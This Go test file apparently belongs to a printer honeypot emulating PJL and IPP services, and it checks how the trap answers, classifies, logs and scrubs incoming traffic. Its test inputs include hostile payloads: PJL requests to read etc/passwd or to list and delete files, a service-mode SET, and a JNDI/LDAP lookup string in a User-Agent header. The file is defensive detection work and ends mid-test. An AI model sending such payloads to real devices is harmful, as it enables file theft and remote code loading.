package trap

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/st0o0/ran/internal/alert"
)

// ---- PJL ----

// pjlExchange sends data, half-closes the connection and returns everything the
// trap answered.
func pjlExchange(t *testing.T, addr string, data []byte) string {
	t.Helper()
	conn := dialTrap(t, addr)
	if _, err := conn.Write(data); err != nil {
		t.Fatal(err)
	}
	if tc, ok := conn.(*net.TCPConn); ok {
		_ = tc.CloseWrite()
	}
	out, err := io.ReadAll(conn)
	if err != nil {
		// The trap may reset a connection with unread input once it stops reading.
		t.Logf("read: %v", err)
	}
	return string(out)
}

func TestPJLProbeCommands(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"info id", "@PJL INFO ID\r\n", "\"" + pjlModel + "\""},
		{"info id lowercase", "@pjl info id\n", pjlModel},
		{"info status", "@PJL INFO STATUS\r\n", "CODE=10001"},
		{"info config", "@PJL INFO CONFIG\r\n", pjlSerial},
		{"info variables", "@PJL INFO VARIABLES\r\n", "COPIES=1"},
		{"info ustatus", "@PJL INFO USTATUS\r\n", "@PJL USTATUS DEVICE"},
		{"ustatus", "@PJL USTATUS DEVICE=ON\r\n", "@PJL USTATUS DEVICE"},
		{"unknown info category", "@PJL INFO NOSUCHTHING\r\n", "@PJL INFO\r\n?"},
		{"with UEL", "\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X", pjlModel},
		{"echo without text", "@PJL ECHO\r\n", "@PJL ECHO\r\n\f"},
		{"filesys", "@PJL INFO FILESYS\r\n", "[1 TABLE]"},
		{"cr only line endings", "@PJL INFO STATUS\r@PJL INFO ID\r", pjlModel},
		{"cr only after comment", "@PJL COMMENT hi\r@PJL INFO CONFIG\r", pjlSerial},
		{"job framing", "@PJL JOB NAME=\"x\"\r\n@PJL EOJ\r\n@PJL INFO ID\r\n", pjlModel},
		{"inquire", "@PJL INQUIRE MARKERXYZ\r\n", "@PJL INQUIRE\r\n?"},
		{"no final newline", "@PJL INFO ID", pjlModel},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			it := startICS(t, "pjl", buildPJL)
			out := pjlExchange(t, it.addr, []byte(tc.in))
			if !strings.Contains(out, tc.want) {
				t.Errorf("response %q lacks %q", out, tc.want)
			}
			if !strings.HasSuffix(out, "\f") {
				t.Errorf("response %q does not end with a form feed", out)
			}
			if strings.Contains(out, "MARKERXYZ") {
				t.Errorf("response reflects client text: %q", out)
			}
			if got := it.sink.waitOutcome(t); got != alert.ClassProbe {
				t.Errorf("class = %s, want probe", got)
			}
			if hasClass(it.sink.snapshot(), alert.ClassAttack) {
				t.Error("probe command produced an attack")
			}
		})
	}
}

func TestPJLAttackCommands(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		in   string
		kind string
		resp string
	}{
		{"fsdir", "@PJL FSDIR NAME=\"0:\\\\\" ENTRY=1 COUNT=65535\r\n", pjlKindFS, "@PJL FSDIR FILEERROR=3"},
		{"fsupload", "@PJL FSUPLOAD NAME=\"0:\\\\etc\\\\passwd\"\r\n", pjlKindFS, "@PJL FSUPLOAD FILEERROR=3"},
		{"fsdownload", "@PJL FSDOWNLOAD FORMAT:BINARY SIZE=4 NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSDOWNLOAD FILEERROR=3"},
		{"fsdelete", "@PJL FSDELETE NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSDELETE FILEERROR=3"},
		{"fsmkdir", "@PJL FSMKDIR NAME=\"0:\\\\x\"\r\n", pjlKindFS, "@PJL FSMKDIR FILEERROR=3"},
		{"set", "@PJL SET SERVICEMODE=HPBOOT\r\n", pjlKindSet, "@PJL SET ?"},
		{"default", "@PJL DEFAULT COPIES=9\r\n", pjlKindSet, "@PJL DEFAULT ?"},
		{"opmsg", "@PJL OPMSG DISPLAY=\"hi\"\r\n", pjlKindSet, "@PJL OPMSG ?"},
		{"unknown command", "@PJL NOSUCHVERB X\r\n", pjlKindOther, "@PJL ?"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			it := startICS(t, "pjl", buildPJL)
			out := pjlExchange(t, it.addr, []byte("\x1b%-12345X"+tc.in))
			if !strings.Contains(out, tc.resp) {
				t.Errorf("response %q lacks %q", out, tc.resp)
			}
			ev := waitAttack(t, it.sink)
			assertMetaKeys(t, ev, "kind", "command")
			if ev.Meta["kind"] != tc.kind {
				t.Errorf("kind = %q, want %q", ev.Meta["kind"], tc.kind)
			}
			if !strings.HasPrefix(strings.ToUpper(ev.Meta["command"]), "@PJL") {
				t.Errorf("command meta = %q", ev.Meta["command"])
			}
			if ev.Info.Commands == 0 {
				t.Errorf("info = %+v, want a command", ev.Info)
			}
		})
	}
}

func TestPJLCommandMetaScrubsSecrets(t *testing.T) {
	t.Parallel()
	it := startICS(t, "pjl", buildPJL)
	pjlExchange(t, it.addr, []byte("@PJL SET PASSWORD=hunter2topsecret\r\n"))
	ev := waitAttack(t, it.sink)
	if strings.Contains(ev.Meta["command"], "hunter2") {
		t.Errorf("secret in meta: %q", ev.Meta["command"])
	}
	waitUntil(t, func() bool { return strings.Contains(it.logs.String(), `"action":"command"`) })
	if strings.Contains(it.logs.String(), "hunter2") {
		t.Errorf("secret in log:\n%s", it.logs.String())
	}
}

func TestPJLPrintData(t *testing.T) {
	t.Parallel()
	it := startICS(t, "pjl", buildPJL)
	data := append([]byte("\x1b%-12345X@PJL ENTER LANGUAGE=POSTSCRIPT\r\n%!PS-Adobe-3.0\r\n"), bytes.Repeat([]byte("A"), 5000)...)
	data = append(data, "\x00\x01\x02password=hunter2zz"...)
	pjlExchange(t, it.addr, data)

	ev := waitAttack(t, it.sink)
	assertMetaKeys(t, ev, "kind", "data_bytes", "data_hash")
	if ev.Meta["kind"] != pjlKindPrintData || len(ev.Meta["data_hash"]) != pjlHashHexLen {
		t.Errorf("meta = %v", ev.Meta)
	}
	if ev.Info.PayloadBytes < 5000 {
		t.Errorf("payload bytes = %d, want the print data size", ev.Info.PayloadBytes)
	}
	waitUntil(t, func() bool { return strings.Contains(it.logs.String(), `"payload_type":"pjl_data"`) })
	logs := it.logs.String()
	if strings.Contains(logs, "hunter2") {
		t.Errorf("secret from print data in log")
	}
	if strings.Contains(logs, strings.Repeat("A", pjlSampleBytes+1)) {
		t.Error("sample longer than the limit in log")
	}
	if !strings.Contains(logs, strings.Repeat("A", 20)) || strings.Contains(logs, "\\u0000") {
		t.Errorf("sample should be printable text:\n%s", logs)
	}
}

func TestPJLReadLimits(t *testing.T) {
	t.Parallel()
	t.Run("total bytes", func(t *testing.T) {
		t.Parallel()
		it := startICS(t, "pjl", buildPJL)
		conn := dialTrap(t, it.addr)
		go func() {
			chunk := bytes.Repeat([]byte("B"), 4096)
			for range 64 {
				if _, err := conn.Write(chunk); err != nil {
					return
				}
			}
		}()
		_, _ = io.Copy(io.Discard, conn)
		it.waitOutcomeLabel(t, "pjl", outcomeTooLong)
		ev := waitAttack(t, it.sink)
		assertMetaKeys(t, ev, "kind", "data_bytes", "data_hash")
	})
	t.Run("command count", func(t *testing.T) {
		t.Parallel()
		it := startICS(t, "pjl", buildPJL)
		pjlExchange(t, it.addr, bytes.Repeat([]byte("@PJL INFO ID\r\n"), pjlMaxEvents+20))
		it.waitOutcomeLabel(t, "pjl", "completed")
		// Server side count: a reset connection can drop answers the client already got.
		if n := strings.Count(it.logs.String(), `"msg":"pjl_request"`); n != pjlMaxEvents {
			t.Errorf("served %d commands, want %d", n, pjlMaxEvents)
		}
	})
	t.Run("long line is split into chunks", func(t *testing.T) {
		t.Parallel()
		it := startICS(t, "pjl", buildPJL)
		out := pjlExchange(t, it.addr, append([]byte("@PJL FSDIR NAME=\""), bytes.Repeat([]byte("x"), 3000)...))
		if !strings.Contains(out, "FILEERROR") {
			t.Errorf("response = %q", out)
		}
		ev := waitAttack(t, it.sink)
		if len(ev.Meta["command"]) > 256 {
			t.Errorf("command meta is %d bytes", len(ev.Meta["command"]))
		}
	})
}

func TestPJLStopClosesConnection(t *testing.T) {
	t.Parallel()
	it := startICS(t, "pjl", buildPJL)
	conn := dialTrap(t, it.addr)
	_, _ = conn.Write([]byte("@PJL INFO ID\r\n"))
	buf := make([]byte, 64)
	if _, err := conn.Read(buf); err != nil {
		t.Fatal(err)
	}
	assertStopClosesConn(t, it, conn)
}

func TestPrintableSample(t *testing.T) {
	t.Parallel()
	if got := printableSample([]byte("ab\x00\xffc\n"), 4); got != "ab.." {
		t.Errorf("sample = %q", got)
	}
	if got := printableSample(nil, 4); got != "" {
		t.Errorf("sample = %q", got)
	}
}

// ---- IPP ----

// ippBody builds an IPP request. attrs are appended to the operation attributes
// group; doc follows the end-of-attributes tag.
func ippBody(op uint16, requestID uint32, jobName string, doc []byte) []byte {
	b := []byte{2, 0}
	b = binary.BigEndian.AppendUint16(b, op)
	b = binary.BigEndian.AppendUint32(b, requestID)
	w := &ippWriter{b: []byte{ippTagOperationAttrs}}
	w.str(0x47, "attributes-charset", "utf-8")
	w.str(0x48, "attributes-natural-language", "en")
	w.str(0x45, "printer-uri", "ipp://MARKERHOST/ipp/print")
	if jobName != "" {
		w.str(0x42, "job-name", jobName)
	}
	b = append(b, w.b...)
	b = append(b, ippTagEnd)
	return append(b, doc...)
}

func startIPP(t *testing.T) *stubHarness {
	return startStub(t, "ipp", buildIPP)
}

func ippPost(t *testing.T, h *stubHarness, path string, body []byte, headers map[string]string) stubResult {
	t.Helper()
	hd := map[string]string{"Content-Type": "application/ipp", "User-Agent": "cups/2.4"}
	for k, v := range headers {
		hd[k] = v
	}
	return stubDo(t, h.addr, "POST", path, hd, string(body))
}

func ippStatus(t *testing.T, res stubResult) uint16 {
	t.Helper()
	if res.status != http.StatusOK || res.header.Get("Content-Type") != "application/ipp" {
		t.Fatalf("http status %d, content type %q", res.status, res.header.Get("Content-Type"))
	}
	if len(res.body) < 9 {
		t.Fatalf("short IPP response: %x", res.body)
	}
	return binary.BigEndian.Uint16([]byte(res.body[2:4]))
}

func TestIPPProbeOperations(t *testing.T) {
	t.Parallel()
	for _, op := range []uint16{ippOpGetPrinterAttrs, ippOpGetJobs, ippOpValidateJob, ippOpCUPSGetPrinters, ippOpCUPSGetDefault} {
		t.Run(ippOpName(op), func(t *testing.T) {
			t.Parallel()
			h := startIPP(t)
			res := ippPost(t, h, "/printers/MARKERPATH", ippBody(op, 0x01020304, "", nil), map[string]string{
				"X-Forwarded-For": "1.1.1.1",
				"Host":            "evil.example.invalid:631",
			})
			if st := ippStatus(t, res); st != ippStatusOK {
				t.Errorf("status = 0x%04x", st)
			}
			b := []byte(res.body)
			if binary.BigEndian.Uint32(b[4:8]) != 0x01020304 || b[0] != 2 || b[1] != 0 {
				t.Errorf("version or request id wrong: %x", b[:8])
			}
			// The response must parse as IPP: groups and end tag.
			if _, err := parseIPP(b); err != nil {
				t.Errorf("response is not valid IPP: %v", err)
			}
			hasAttrs := op == ippOpGetPrinterAttrs || op == ippOpCUPSGetPrinters || op == ippOpCUPSGetDefault
			if got := bytes.Contains(b, []byte(ippPrinterModel)); got != hasAttrs {
				t.Errorf("printer attributes present = %v, want %v", got, hasAttrs)
			}
			for _, bad := range []string{"MARKERHOST", "MARKERPATH", "evil.example", "1.1.1.1", "cups/2.4"} {
				if bytes.Contains(b, []byte(bad)) || strings.Contains(res.header.Get("Server"), bad) {
					t.Errorf("response reflects client data %q", bad)
				}
			}
			ev := h.waitClass(t, false)
			if ev.Class != alert.ClassProbe {
				t.Errorf("class = %s", ev.Class)
			}
		})
	}
}

func TestIPPPrinterAttributesContent(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	res := ippPost(t, h, "/ipp/print", ippBody(ippOpGetPrinterAttrs, 7, "", nil), nil)
	ippStatus(t, res)
	b := []byte(res.body)
	for _, want := range []string{"printer-name", "printer-make-and-model", "printer-state", "printer-uri-supported", ippPrinterURI, "printer-is-accepting-jobs", "ipp-versions-supported"} {
		if !bytes.Contains(b, []byte(want)) {
			t.Errorf("response lacks %q", want)
		}
	}
	// printer-state: enum tag, name, 4 byte value 3 (idle).
	state := append(append([]byte{0x23, 0, 13}, "printer-state"...), 0, 4, 0, 0, 0, ippPrinterState)
	if !bytes.Contains(b, state) {
		t.Error("printer-state idle attribute missing")
	}
}

func TestIPPPrintJobIsCommand(t *testing.T) {
	t.Parallel()
	doc := bytes.Repeat([]byte("DOCSECRETBYTES"), 2000)
	cases := []struct {
		name   string
		op     uint16
		status uint16
		kind   string
	}{
		{"print job", ippOpPrintJob, ippStatusNotAuthorized, ippKindPrintJob},
		{"create job", ippOpCreateJob, ippStatusNotAuthorized, ippKindPrintJob},
		{"send document", ippOpSendDocument, ippStatusNotAuthorized, ippKindPrintJob},
		{"send uri", ippOpSendURI, ippStatusNotAuthorized, ippKindPrintJob},
		{"cancel job", ippOpCancelJob, ippStatusOperationNotSupp, ippKindOther},
		{"unknown op", 0x7777, ippStatusOperationNotSupp, ippKindOther},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			h := startIPP(t)
			res := ippPost(t, h, "/ipp/print", ippBody(tc.op, 99, "report.pdf", doc), map[string]string{"X-Forwarded-For": "1.1.1.1"})
			if st := ippStatus(t, res); st != tc.status {
				t.Errorf("status = 0x%04x, want 0x%04x", st, tc.status)
			}
			ev := waitAttack(t, h.sink)
			assertMetaKeys(t, ev, "path", "method", "user_agent", "command", "kind", "operation", "job_name", "document_bytes")
			if ev.Meta["kind"] != tc.kind || ev.Meta["job_name"] != "report.pdf" {
				t.Errorf("meta = %v", ev.Meta)
			}
			if ev.Meta["document_bytes"] != "28000" {
				t.Errorf("document_bytes = %q, want 28000", ev.Meta["document_bytes"])
			}
			if ev.Info.SourceIP != "127.0.0.1" {
				t.Errorf("source ip = %q, want the socket peer", ev.Info.SourceIP)
			}
			waitUntil(t, func() bool { return strings.Contains(h.logs.String(), `"claimed_client_ip":"1.1.1.1"`) })
			if strings.Contains(h.logs.String(), "DOCSECRET") {
				t.Error("document bytes in log")
			}
			for k, v := range ev.Meta {
				if strings.Contains(v, "DOCSECRET") {
					t.Errorf("document bytes in meta %s", k)
				}
			}
		})
	}
}

func TestIPPJobNameSanitized(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	name := "pw=1\x1b[31m" + strings.Repeat("n", 300) + "\xff"
	ippPost(t, h, "/", ippBody(ippOpPrintJob, 1, name, nil), nil)
	ev := waitAttack(t, h.sink)
	if len(ev.Meta["job_name"]) > ippMaxJobName || strings.ContainsAny(ev.Meta["job_name"], "\x1b") || !utf8.ValidString(ev.Meta["job_name"]) {
		t.Errorf("job_name = %q", ev.Meta["job_name"])
	}
	h2 := startIPP(t)
	ippPost(t, h2, "/", ippBody(ippOpPrintJob, 1, "password=hunter2", nil), nil)
	ev = waitAttack(t, h2.sink)
	if strings.Contains(ev.Meta["job_name"], "hunter2") || strings.Contains(ev.Meta["command"], "hunter2") {
		t.Errorf("secret in meta: %v", ev.Meta)
	}
	waitUntil(t, func() bool { return strings.Contains(h2.logs.String(), `"action":"command"`) })
	if strings.Contains(h2.logs.String(), "hunter2") {
		t.Error("secret in log")
	}
}

func TestIPPNonIPPRequests(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name   string
		method string
		path   string
		body   string
		status int
		attack bool
	}{
		{"home page", "GET", "/", "", 200, false},
		{"printers page", "GET", "/printers/x", "", 200, false},
		{"head", "HEAD", "/", "", 200, false},
		{"options unknown path", "OPTIONS", "/nothing", "", 404, false},
		{"unknown path", "GET", "/nothing", "", 404, false},
		{"get with body", "GET", "/", "x=1", 200, true},
		{"put", "PUT", "/ipp/print", "x", 405, true},
		{"delete", "DELETE", "/", "", 405, true},
		{"post not ipp", "POST", "/ipp/print", "hello", 400, true},
		{"post empty", "POST", "/", "", 400, true},
		{"truncated header", "POST", "/", "\x02\x00\x00\x0b", 400, true},
		{"bad version", "POST", "/", "\x09\x09\x00\x0b\x00\x00\x00\x01\x03", 400, true},
		{"name length past end", "POST", "/", "\x02\x00\x00\x0b\x00\x00\x00\x01\x01\x47\xff\xff", 400, true},
		{"no end tag", "POST", "/", "\x02\x00\x00\x0b\x00\x00\x00\x01\x01", 400, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			h := startIPP(t)
			res := stubDo(t, h.addr, tc.method, tc.path, map[string]string{"User-Agent": "scanner"}, tc.body)
			if res.status != tc.status {
				t.Errorf("status = %d, want %d", res.status, tc.status)
			}
			ev := h.waitClass(t, tc.attack)
			if tc.attack {
				keys := []string{"path", "method", "user_agent", "command", "kind"}
				if tc.name == "get with body" {
					keys = keys[:3]
					keys = append(keys, "kind")
				}
				assertMetaKeys(t, ev, keys...)
			}
		})
	}
}

func TestIPPOptionsStatus(t *testing.T) {
	t.Parallel()
	// OPTIONS on a known path answers 200 like GET and HEAD.
	h := startIPP(t)
	res := stubDo(t, h.addr, "OPTIONS", "/ipp/print", nil, "")
	if res.status != 200 {
		t.Errorf("status = %d", res.status)
	}
	h.waitClass(t, false)
}

func TestIPPJNDIIsCommand(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	res := ippPost(t, h, "/ipp/print", ippBody(ippOpGetPrinterAttrs, 1, "", nil), map[string]string{"User-Agent": "${jndi:ldap://8.8.8.8/a}"})
	ippStatus(t, res)
	ev := waitAttack(t, h.sink)
	if ev.Meta["kind"] != ippKindOther {
		t.Errorf("meta = %v", ev.Meta)
	}
}

func TestIPPStopClosesConnections(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	assertStopClosesConnections(t, h, "GET / HTTP/1.1\r\nHost: x\r\n\r\n")
}

func TestParseIPPTable(t *testing.T) {
	t.Parallel()
	good := ippBody(ippOpPrintJob, 5, "job", []byte("doc"))
	req, err := parseIPP(good)
	if err != nil || req.operation != ippOpPrintJob || req.requestID != 5 || req.jobName != "job" || req.docOffset != len(good)-3 {
		t.Fatalf("req = %+v, err = %v", req, err)
	}
	// Attribute limit: more attributes than ippMaxAttrs still parse, and the
	// job name placed after the limit is not read.
	w := &ippWriter{b: []byte{2, 0, 0, 2, 0, 0, 0, 1, ippTagOperationAttrs}}
	for range ippMaxAttrs {
		w.str(0x44, "a", "b")
	}
	w.str(0x42, "job-name", "late")
	req, err = parseIPP(append(w.b, ippTagEnd))
	if err != nil || req.jobName != "" {
		t.Errorf("req = %+v, err = %v", req, err)
	}
	// Additional values keep the previous name.
	w = &ippWriter{b: []byte{1, 1, 0, 2, 0, 0, 0, 1, ippTagOperationAttrs}}
	w.str(0x42, "job-name", "first")
	w.str(0x42, "", "second")
	noDoc := append(w.b, ippTagEnd)
	// An end tag in the last byte: the document starts at the end, with no byte in hand.
	if req, err = parseIPP(noDoc); err != nil || req.jobName != "first" || req.docOffset != len(noDoc) {
		t.Errorf("req = %+v, err = %v", req, err)
	}
	for _, bad := range [][]byte{nil, good[:8], {3, 0, 0, 2, 0, 0, 0, 1, 3}, good[:len(good)-4]} {
		if _, err := parseIPP(bad); err == nil && len(bad) < len(good)-3 {
			t.Errorf("parse of %x succeeded", bad)
		}
	}
}

func TestIPPSessionPerConnection(t *testing.T) {
	t.Parallel()
	h := startIPP(t)
	conn, err := net.DialTimeout("tcp", h.addr, 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	body := ippBody(ippOpGetPrinterAttrs, 1, "", nil)
	req := "POST /ipp/print HTTP/1.1\r\nHost: x\r\nContent-Type: application/ipp\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n\r\n" + string(body)
	// Two requests on one connection share one session and stay a single probe.
	_, _ = io.WriteString(conn, req+req)
	buf := make([]byte, 64)
	_, _ = conn.Read(buf)
	conn.Close()
	ev := h.waitClass(t, false)
	if ev.Class != alert.ClassProbe {
		t.Errorf("class = %s", ev.Class)
	}
}

// ---- PJL depth ----

func TestPJLCROnlyLinesAreBothAnswered(t *testing.T) {
	t.Parallel()
	it := startICS(t, "pjl", buildPJL)
	out := pjlExchange(t, it.addr, []byte("@PJL INFO STATUS\r@PJL INFO ID\r"))
	if !strings.Contains(out, "CODE=10001") || !strings.Contains(out, pjlModel) {
		t.Errorf("response %q lacks one of the two answers", out)
	}
	if got := it.sink.waitOutcome(t); got != alert.ClassProbe {
		t.Errorf("class = %s, want probe", got)
	}
}

func TestPJLEchoReflectionIsBounded(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"plain token", "@PJL ECHO MARKERXYZ\r\n", "@PJL ECHO MARKERXYZ\r\n\f"},
		{"lowercase verb", "@pjl echo hello world\r\n", "@PJL ECHO hello world\r\n\f"},
		{"cut at 32 bytes", "@PJL ECHO " + strings.Repeat("A", 100) + "\r\n", "@PJL ECHO " + strings.Repeat("A", pjlMaxEchoBytes) + "\r\n\f"},
		{"non-printable bytes dropped", "@PJL ECHO a\x00b\x07c\xffd\r\n", "@PJL ECHO abcd\r\n\f"},
		{"no text", "@PJL ECHO\r\n", "@PJL ECHO\r\n\f"},
		{"only non-printable", "@PJL ECHO \x01\x02\r\n", "@PJL ECHO\r\n\f"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			it := startICS(t, "pjl", buildPJL)
			out := pjlExchange(t, it.addr, []byte(tc.in))
			if out != tc.want {
				t.Errorf("response = %q, want %q", out, tc.want)
			}
			for _, c := range []byte(strings.TrimSuffix(strings.TrimPrefix(out, "@PJL ECHO"), "\r\n\f")) {
				if c < 0x20 || c >= 0x7F {
					t.Errorf("response reflects byte 0x%02x", c)
				}
			}
			if got := it.sink.waitOutcome(t); got != alert.ClassProbe {
				t.Errorf("class = %s, want probe", got)
			}
		})
	}
	// Non-printable runs are dropped, and an escape never comes back.
	if got := pjlEchoToken("@PJL ECHO " + strings.Repeat("\x01", 500) + "tail"); got != "tail" {
		t.Errorf("token = %q", got)
	}
	if got := pjlEchoToken("@PJL ECHO \x1b%-12345X"); strings.ContainsRune(got, 0x1b) {
		t.Errorf("token = %q reflects ESC", got)
	}
}

func TestPJLNoiseIsProbe(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name  string
		in    []byte
		label string
	}{
		{"http get", []byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n"), sniffHTTP},
		{"http post", []byte("POST /a HTTP/1.1\r\nContent-Length: 0\r\n\r\n"), sniffHTTP},
		{"tls hello", append([]byte{0x16, 0x03, 0x01, 0x00, 0x20, 0x01, 0x00}, bytes.Repeat([]byte{0x41}, 40)...), sniffTLS},
		{"ssh banner", []byte("SSH-2.0-OpenSSH_9.6\r\n"), sniffSSH},
		{"smb", []byte{0, 0, 0, 0x2F, 0xFF, 'S', 'M', 'B', 0x72, 0, 0, 0}, sniffSMB},
		{"rdp", []byte{3, 0, 0, 0x13, 0x0E, 0xE0, 0, 0, 0, 0, 0, 1, 0, 8, 0, 3, 0, 0, 0}, sniffRDP},
		{"after UEL", []byte("\x1b%-12345XGET / HTTP/1.1\r\n\r\n"), sniffHTTP},
		{"after blank lines", []byte("\r\n\r\nGET / HTTP/1.1\r\n\r\n"), sniffHTTP},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			it := startICS(t, "pjl", buildPJL)
			out := pjlExchange(t, it.addr, tc.in)
			if out != "" {
				t.Errorf("noise got an answer: %q", out)
			}
			if got := it.sink.waitOutcome(t); got != alert.ClassProbe {
				t.Errorf("class = %s, want probe", got)
			}
			if hasClass(it.sink.snapshot(), alert.ClassAttack) {
				t.Error("noise produced an attack")
			}
			waitUntil(t, func() bool { return strings.Contains(it.logs.String(), `"sniffed_protocol":"`+tc.label+`"`) })
			if strings.Contains(it.logs.String(), `"payload_type":"pjl_data"`) {
				t.Error("noise logged print data")
			}
		})
	}
}

// Print data that is not noise stays print_data, also when it is PCL, plain text
// or binary, or when HTTP-looking text follows a PJL header.
func TestPJLPrintDataKinds(t *testing.T) {
	t.Parallel()
	cases := map[string][]byte{
		"pcl":        []byte("\x1bE\x1b&l0O\x1b(s0p16.66h8.5v0s0b3T hello\r\n"),
		"postscript": []byte("%!PS-Adobe-3.0\r\nshowpage\r\n"),
		"text":       []byte("hello printer\r\n"),
		"binary":     {0x01, 0x02, 0x03, 0xFE, 0xFF, 0x00, 0x10},
		"http later": []byte("@PJL ENTER LANGUAGE=PCL\r\nGET / HTTP/1.1\r\n"),
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			it := startICS(t, "pjl", buildPJL)
			pjlExchange(t, it.addr, in)
			ev := waitAttack(t, it.sink)
			if ev.Meta["kind"] != pjlKindPrintData {
				t.Errorf("meta = %v", ev.Meta)
			}
		})
	}
}

func TestUELStripperAcrossChunks(t *testing.T) {
	t.Parallel()
	whole := "ab" + string(pjlUEL) + "cd"
	for cut := 0; cut <= len(whole); cut++ {
		var u uelStripper
		got := string(u.strip([]byte(whole[:cut])))
		got += string(u.strip([]byte(whole[cut:])))
		got += string(u.flush())
		if got != "abcd" {
			t.Errorf("cut %d: %q", cut, got)
		}
		if len(u.carry) != 0 {
			t.Errorf("cut %d: carry %q left", cut, u.carry)
		}
	}
	// A prefix that never completes is passed on at the end of the stream.
	var u uelStripper
	got := string(u.strip([]byte("x\x1b%-12")))
	got += string(u.flush())
	if got != "x\x1b%-12" {
		t.Errorf("incomplete prefix = %q", got)
	}
	// The carry never exceeds 16 bytes.
	for range 20 {
		u.strip(bytes.Repeat([]byte{0x1b}, 40))
		if len(u.carry) > 16 {
			t.Fatalf("carry of %d bytes", len(u.carry))
		}
	}
}

// A UEL that straddles the 1024 byte read boundary is stripped and the command
// behind it is still recognized.
func TestPJLUELSplitAcrossReads(t *testing.T) {
	t.Parallel()
	it := startICS(t, "pjl", buildPJL)
	data := append(bytes.Repeat([]byte("."), pjlMaxChunk-4), pjlUEL...)
	data = append(data, "@PJL INFO ID\r\n"...)
	out := pjlExchange(t, it.addr, data)
	if !strings.Contains(out, pjlModel) {
		t.Errorf("response %q lacks the printer id", out)
	}
}

// ---- IPP depth ----

// ippRaw sends raw HTTP request parts and reads until the connection ends. Write
// and read errors are ignored: the trap may reset a connection with unread input.
func ippRaw(t *testing.T, addr string, parts ...[]byte) {
	t.Helper()
	conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	for _, p := range parts {
		if _, err := conn.Write(p); err != nil {
			break
		}
	}
	if tc, ok := conn.(*net.TCPConn); ok {
		_ = tc.CloseWrite()
	}
	_, _ = io.Copy(io.Discard, conn)
}

func ippHead(contentLength string) []byte {
	return []byte("POST /ipp/print HTTP/1.1\r\nHost: x\r\nContent-Type: application/ipp\r\nConnection: close\r\nContent-Length: " + contentLength + "\r\n\r\n")
}

// ippPadded builds a request of exactly total bytes up to and including the end
// tag, followed by doc.
func ippPadded(op uint16, total int, doc []byte) []byte {
	b := []byte{2, 0}
	b = binary.BigEndian.AppendUint16(b, op)
	b = binary.BigEndian.AppendUint32(b, 1)
	b = append(b, ippTagOperationAttrs)
	// One attribute: tag, name length, name "x", value length, value; then the end tag.
	valLen := total - len(b) - (1 + 2 + 1 + 2) - 1
	w := &ippWriter{}
	w.attr(0x41, "x", bytes.Repeat([]byte("p"), valLen))
	b = append(b, w.b...)
	return append(append(b, ippTagEnd), doc...)
}

func TestIPPDocumentSizeBounds(t *testing.T) {
	t.Parallel()
	t.Run("huge declared content length is clamped", func(t *testing.T) {
		t.Parallel()
		h := startIPP(t)
		body := ippBody(ippOpPrintJob, 1, "big", bytes.Repeat([]byte("D"), 20000))
		ippRaw(t, h.addr, ippHead("9223372036854775807"), body)
		ev := waitAttack(t, h.sink)
		if ev.Meta["document_bytes"] != strconv.FormatInt(ippMaxDocBytes, 10) {
			t.Errorf("document_bytes = %q, want the clamp %d", ev.Meta["document_bytes"], ippMaxDocBytes)
		}
		if ev.Info.PayloadBytes != maxPayloadBytes {
			t.Errorf("payload bytes = %d, want the cap %d", ev.Info.PayloadBytes, maxPayloadBytes)
		}
	})
	t.Run("two print jobs on one keep-alive connection", func(t *testing.T) {
		t.Parallel()
		h := startIPP(t)
		conn, err := net.DialTimeout("tcp", h.addr, 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
		br := bufio.NewReader(conn)
		for _, n := range []int{100, 250} {
			body := ippBody(ippOpPrintJob, 1, "j", bytes.Repeat([]byte("D"), n))
			head := "POST /ipp/print HTTP/1.1\r\nHost: x\r\nContent-Type: application/ipp\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n\r\n"
			_, _ = conn.Write(append([]byte(head), body...))
			resp, err := http.ReadResponse(br, nil)
			if err != nil {
				t.Fatal(err)
			}
			_, _ = io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
		waitUntil(t, func() bool { return strings.Count(h.logs.String(), `"payload_type":"ipp_document"`) == 2 })
		logs := h.logs.String()
		if !strings.Contains(logs, `"bytes":100`) || !strings.Contains(logs, `"bytes":250`) {
			t.Errorf("document sizes missing from log:\n%s", logs)
		}
		ev := waitAttack(t, h.sink)
		if ev.Meta["document_bytes"] != "100" || ev.Info.PayloadBytes != 100 {
			t.Errorf("first alert = %v (payload %d)", ev.Meta, ev.Info.PayloadBytes)
		}
	})
	t.Run("end tag is the last byte", func(t *testing.T) {
		t.Parallel()
